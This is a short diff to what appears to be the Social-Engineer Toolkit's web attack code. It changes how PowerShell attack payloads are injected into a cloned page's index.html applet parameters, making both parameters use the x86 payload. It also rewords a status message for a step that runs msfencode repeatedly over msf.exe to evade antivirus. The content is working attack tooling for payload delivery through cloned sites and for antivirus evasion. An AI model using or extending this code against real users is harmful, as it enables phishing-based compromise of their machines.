@@ -565,17 +565,14 @@ try:
                 if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                     try: reload(src.payloads.powershell.prep)
                     except: import src.payloads.powershell.prep
-                    if os.path.isfile("%s/x64.powershell" % (setdir)):
-                        fileopen1 = file("%s/x64.powershell" % (setdir), "r")
-                        x64 = fileopen1.read()
+                    if os.path.isfile("%s/x86.powershell" % (setdir)):
+                        fileopen1 = file("%s/x86.powershell" % (setdir), "r")
+                        x86 = fileopen1.read()
                         # open up the x86 powershell attack
-                        fileopen2 =file(setdir + "/x86.powershell", "r")
-                        x86 = fileopen2.read()
-                        # open up the original file and replace stuff
                         fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
                         filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
                         data = fileopen3.read()
-                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (x64))
+                        data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (x86))
                         data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (x86))
                         # check if we don't want to deploy binaries
                         deploy_binaries = check_config("DEPLOY_BINARIES=")
@@ -589,7 +586,7 @@ try:
             # If not option 16 or default then go here
             if encode != "MULTIENCODE":
                 if encode != "BACKDOOR":
-                    print_info("Encoding the payload %s times to get around pesky Anti-Virus. [-]\n" % (str(encount)))
+                    print_info("Encoding the payload %s times. [-]\n" % (str(encount)))
                     encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/1msf.exe -e %s -o %s/msf.exe -t exe -c %s" % (path,setdir,encode,setdir,encount), shell=True).wait()
 
             # If option 16 or default then go here
